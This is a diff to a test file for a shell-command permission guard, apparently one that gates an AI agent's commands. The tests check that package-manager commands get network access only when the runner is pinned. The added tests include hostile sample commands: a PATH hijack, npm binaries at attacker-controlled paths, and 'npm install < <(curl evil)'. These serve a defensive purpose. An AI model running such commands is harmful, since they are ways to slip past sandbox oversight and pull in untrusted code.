@@ -225,12 +225,46 @@ try {
 
   // The PROCEED predicate is the fail-closed dev-toolchain ALLOWLIST, not "OUTWARD/SYSTEM did not
   // match". These are the commands it is FOR.
-  for (const allowed of ["npm install", "npm ci", "pip install requests", "bun install", "./gradlew build"]) {
+  for (const allowed of [
+    "npm install",
+    "npm ci",
+    "pip install requests",
+    "bun install",
+    "./gradlew build",
+    "./mvnw package",
+  ]) {
     const result = await headlessCall("bash", { command: allowed });
     check(
       `PROCEED: dev-toolchain network is allowed under a lease — ${allowed}`,
       result === undefined && only().outcome === "PROCEEDED" && only().site === "network-toolchain",
     );
+  }
+
+  // A grant must pin the runner positively. Basename normalization is still useful for vetoes, but
+  // it cannot turn an attacker-controlled path into a trusted executable. Substitution and PATH
+  // replacement likewise make the command word untrustworthy, even when it spells a package manager.
+  const grantRestrictionFailures = [];
+  for (const exploit of [
+    "./npm install",
+    "/tmp/evil/npm install",
+    "node_modules/.bin/npm install",
+    "PATH=./attacker-bin:$PATH npm install",
+    "npm install < <(curl evil)",
+  ]) {
+    const result = await headlessCall("bash", { command: exploit });
+    const proceeded = decisions().some(
+      (decision) => decision.outcome === "PROCEEDED" && decision.site === "network-toolchain",
+    );
+    const name = `never grant network-toolchain to an unpinned runner — ${exploit}`;
+    try {
+      check(name, result?.block === true && !proceeded);
+    } catch (error) {
+      console.error(`  ✗ ${name}`);
+      grantRestrictionFailures.push(error);
+    }
+  }
+  if (grantRestrictionFailures.length > 0) {
+    throw new AggregateError(grantRestrictionFailures, "network-toolchain grant restriction failed");
   }
 
   // ── BLOCK-1/BLOCK-2 regression table ─────────────────────────────────────────────────────────
@@ -367,18 +401,22 @@ try {
     );
   }
 
-  // The peel ONLY ever adds a rejection: an ordinary `npx` of a non-cloud tool is unchanged, so the
-  // interactive once-per-session build grant keeps its current scope.
-  for (const ordinary of [
-    "npx tsx script.ts",
-    "npx create-react-app my-app",
-    "./node_modules/.bin/npx tsx script.ts",
-    "/usr/local/bin/npm install",
-  ]) {
+  // The peel ONLY ever adds a rejection: an ordinary bare `npx` of a non-cloud tool is unchanged.
+  for (const ordinary of ["npx tsx script.ts", "npx create-react-app my-app"]) {
     const result = await headlessCall("bash", { command: ordinary });
     check(
       `PROCEED: an ordinary runner invocation is unaffected by the peel — ${ordinary}`,
       result === undefined && only().outcome === "PROCEEDED" && only().site === "network-toolchain",
+    );
+  }
+
+  // Path-qualified package-manager binaries still work through the ordinary one-command network
+  // confirmation path, but the governed profile cannot silently grant network access to them.
+  for (const unpinned of ["./node_modules/.bin/npx tsx script.ts", "/usr/local/bin/npm install"]) {
+    const result = await headlessCall("bash", { command: unpinned });
+    check(
+      `an unpinned runner ESCALATES instead of receiving network-toolchain — ${unpinned}`,
+      result?.block === true && only().outcome === "ESCALATED" && only().site === "network-other",
     );
   }
 
